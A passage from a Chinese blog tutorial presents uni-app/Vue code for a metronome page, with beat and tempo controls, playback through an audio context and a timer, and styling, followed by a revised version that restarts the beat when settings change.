class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 节拍显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>节拍：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; beat &#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 滑块定义节拍数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slider</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;slider&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">min</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">max</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">step</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; beat &#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">change</span>=<span class="string">&quot;handleBeatChange&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">slider</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 速度显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>速度：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; speed &#125;&#125; BPM<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 增加速度按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;increaseSpeed&quot;</span>&gt;</span>加速<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;decreaseSpeed&quot;</span>&gt;</span>减速<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 播放/停止按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;play-button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;togglePlay&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">beat</span>: <span class="number">4</span>, <span class="comment">// 初始节拍数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">speed</span>: <span class="number">60</span>, <span class="comment">// 初始速度（每分钟节拍数）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">playStatus</span>: <span class="string">&#x27;stopped&#x27;</span>, <span class="comment">// 播放状态，初始为停止</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">intervalId</span>: <span class="literal">null</span>, <span class="comment">// 用于存储定时器ID</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">audioContext</span>: <span class="literal">null</span>, <span class="comment">// 音频上下文</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化音频上下文</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">initAudio</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span> = uni.<span class="title function_">createInnerAudioContext</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a1.mp3&#x27;</span>; <span class="comment">// 替换为节拍音效文件路径</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">volume</span> = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 处理滑块改变节拍数的事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleBeatChange</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">beat</span> = event.<span class="property">detail</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 增加速度的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">increaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> += <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 减少速度的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">decreaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> -= <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">speed</span> &lt; <span class="number">10</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">speed</span> = <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换播放/停止状态的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">togglePlay</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;stopped&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;playing&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">initAudio</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">startMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">playStatus</span> = <span class="string">&#x27;stopped&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">stopMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 启动节拍器的方法，通过定时器播放声音</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">startMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> intervalTime = <span class="number">60000</span> / <span class="variable language_">this</span>.<span class="property">speed</span>; <span class="comment">// 根据速度计算每个节拍的间隔时间（毫秒）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>(); <span class="comment">// 播放音效</span></span></span><br><span class="line"><span class="language-javascript">      &#125;, intervalTime);</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 停止节拍器的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">stopMetronome</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalId</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">intervalId</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">stop</span>(); <span class="comment">// 停止音效</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">onUnload</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 页面卸载时清理音频资源</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">destroy</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.label</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.value</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slider</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">90%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button-group</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">gap</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#34c759</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#32a852</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>处理音频文件  a1 a2<br><a class="link"   href="https://audiotrimmer.com/cn/" >https://audiotrimmer.com/cn/<i class="fas fa-external-link-alt"></i></a></p><h1 id="实时更新节拍音效："><a href="#实时更新节拍音效：" class="headerlink" title="实时更新节拍音效："></a>实时更新节拍音效：</h1><p>滑动滑块 (handleBeatChange) 或点击按钮 (increaseSpeed&#x2F;decreaseSpeed) 时，<br>会立即调用 restartMetronome，停止当前节拍器并重新启动。<br>当播放状态为 stopped 时，仅播放一次节拍音效以便即时反馈。<br>新增 restartMetronome 方法：</p><p>停止当前节拍器后，重新启动，以实现动态调整速度和节拍。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 节拍显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>节拍：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; beat &#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 滑块定义节拍数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slider</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;slider&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">min</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">max</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">step</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; beat &#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">change</span>=<span class="string">&quot;handleBeatChange&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">slider</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 速度显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;label&quot;</span>&gt;</span>速度：<span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;value&quot;</span>&gt;</span>&#123;&#123; speed &#125;&#125; BPM<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 增加/减少速度按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;increaseSpeed&quot;</span>&gt;</span>加速<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;decreaseSpeed&quot;</span>&gt;</span>减速<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 播放/停止按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;play-button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;togglePlay&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">beat</span>: <span class="number">4</span>, <span class="comment">// 初始节拍数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">speed</span>: <span class="number">60</span>, <span class="comment">// 初始速度（每分钟节拍数）</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">playStatus</span>: <span class="string">&#x27;stopped&#x27;</span>, <span class="comment">// 播放状态，初始为停止</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">intervalId</span>: <span class="literal">null</span>, <span class="comment">// 用于存储定时器ID</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">audioContext</span>: <span class="literal">null</span>, <span class="comment">// 音频上下文</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化音频上下文</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">initAudio</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span> = uni.<span class="title function_">createInnerAudioContext</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">src</span> = <span class="string">&#x27;/static/sounds/a1.mp3&#x27;</span>; <span class="comment">// 替换为节拍音效文件路径</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="property">volume</span> = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 处理滑块改变节拍数的事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleBeatChange</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">beat</span> = event.<span class="property">detail</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>(); <span class="comment">// 播放一次音效</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 增加速度的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">increaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> += <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>(); <span class="comment">// 播放一次音效</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 减少速度的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">decreaseSpeed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">speed</span> -= <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">speed</span> &lt; <span class="number">5</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">speed</span> = <span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">playStatus</span> === <span class="string">&#x27;playing&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">restartMetronome</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">play</span>(); <span class="comment">// 播放一次音效</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span 